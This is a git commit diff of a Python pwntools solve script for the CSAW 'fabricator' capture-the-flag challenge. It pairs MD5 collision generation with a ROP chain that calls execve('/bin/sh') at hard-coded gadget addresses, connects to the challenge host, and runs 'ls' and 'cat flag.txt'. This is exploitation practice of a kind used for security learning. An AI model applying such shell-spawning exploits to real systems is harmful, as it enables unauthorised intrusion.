06e65cbe9ab8d2acafe751d70e63e6ff7e6c8e4f
Adrian Self <aself.school@gmail.com>
2020-09-26 21:58:31 -0400

    solve fabricator

--- misc/fabricator/solve.py
+++ misc/fabricator/solve.py
@@ -2,17 +2,19 @@
 
 from pwn import *
 from Crypto.Hash import MD5
+from struct import pack
 
 prefix = b"Hi, my name is Jangui. My card is my passport. Please verify me."
 
 def collide(payload):
     assert len(payload) == 400 - 256
     collisions = []
-    i = 0
+    i = 10000000
     while len(collisions)<2:
         msg = (prefix
               +str(i).encode()
-              +b'A'*(256-len(prefix)-len(str(i)))
+              +b'/bin/sh\0'
+              +b'A'*(256-len(prefix)-len(str(i))-len('/bin/sh\0'))
               +payload
               )
         h = MD5.new()
@@ -22,12 +24,49 @@ def collide(payload):
         i+=1
     return collisions
 
-payload = b'B'*144
+### ROP ###
+front_padding = b'B'*24
+pop_rdi = p64(0x00000000004006c6)
+pop_rsi = p64(0x00000000004010dc)
+pop_rax = p64(0x000000000041c0c4)
+pop_rdx = p64(0x0000000000452856)
+syscall = p64(0x000000000047ba25)
+bin_sh  = p64(0x00000000006c4580 + 64 + 8)
 
+payload  = front_padding
+payload += pop_rax
+payload += p64(0x3b)
+payload += pop_rdi
+payload += bin_sh
+payload += pop_rsi
+payload += p64(0)
+payload += pop_rdx
+payload += p64(0)
+payload += syscall
+
+back_padding = b'Z'*(144-len(payload))
+payload += back_padding
+###########
+
+### Solve the "Crypto" part
 ids = collide(payload)
 
-conn = remote('web.red.csaw.io',5012)
+### Choose a target 
+if args.GDB:
+    conn = gdb.debug('./fabricator', gdbscript=(''
+         +'break validHashes\n'
+         +'break runGame\n'
+         +'break *0x00400dae\n'#just put success message
+         +'break *0x400dc8\n'#just copied id1 to stack
+         +'c\n'#start automatically
+        )
+    )
+elif args.LOCAL:
+    conn = process('./fabricator')
+else:
+    conn = remote('web.red.csaw.io',5012)
 
+### Interact ###
 print(conn.recvuntil('>'))
 print(ids[0])
 conn.send(ids[0])
@@ -35,11 +74,20 @@ conn.send(ids[0])
 print(conn.recvuntil('>'))
 print(ids[1])
 conn.send(ids[1])
+################
 
-print(conn.recv())
+### WIN ###
+print(conn.recv().decode())
 
-###WIN###
+print('ls')
+conn.sendline('ls')
 
-conn.interactive()
+print(conn.recv().decode())
+
+print('cat flag.txt')
+conn.sendline('cat flag.txt')
+
+print(conn.recv().decode())
+print()
 
 conn.close()
